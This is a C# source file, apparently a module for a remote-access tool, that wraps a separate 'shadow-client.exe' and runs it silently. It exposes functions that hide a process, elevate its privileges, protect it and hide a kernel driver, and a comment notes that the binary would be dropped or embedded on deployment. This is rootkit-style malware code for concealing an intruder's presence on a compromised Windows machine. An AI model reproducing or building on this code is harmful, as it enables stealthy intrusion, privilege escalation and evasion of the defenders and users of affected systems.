using System;
using System.Diagnostics;
using System.IO;

namespace Pulsar.Plugins.Client.Modules
{
    public static class ShadowWrapper
    {
        // Path to the Rust client executable. 
        // In a real deployment, this would be dropped or embedded.
        private static string ClientPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "shadow-client.exe");

        public static bool Execute(string args, out string output)
        {
            output = "";
            try
            {
                if (!File.Exists(ClientPath))
                {
                    // Search in common build locations if not in base dir
                    string[] possiblePaths = {
                        "shadow-client.exe",
                        @"..\shadow-client.exe",
                        @"shadow-main\target\release\shadow-client.exe"
                    };

                    bool found = false;
                    foreach (var p in possiblePaths)
                    {
                        if (File.Exists(p))
                        {
                            ClientPath = Path.GetFullPath(p);
                            found = true;
                            break;
                        }
                    }

                    if (!found)
                    {
                        output = "shadow-client.exe not found. Please ensure it is in the same directory or built.";
                        return false;
                    }
                }

                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = ClientPath,
                    Arguments = args,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using (Process proc = Process.Start(psi))
                {
                    output = proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();
                    proc.WaitForExit();
                    return proc.ExitCode == 0;
                }
            }
            catch (Exception ex)
            {
                output = "Exception: " + ex.Message;
                return false;
            }
        }

        public static bool HideProcess(int pid, out string message)
        {
            return Execute($"process hide --pid {pid}", out message);
        }

        public static bool ElevateProcess(int pid, out string message)
        {
            return Execute($"process elevate --pid {pid}", out message);
        }

        public static bool ProtectProcess(int pid, out string message)
        {
             return Execute($"process protection --pid {pid} --add", out message);
        }

        public static bool HideDriver(string name, out string message)
        {
            return Execute($"driver --name \"{name}\" --hide", out message);
        }
    }
}
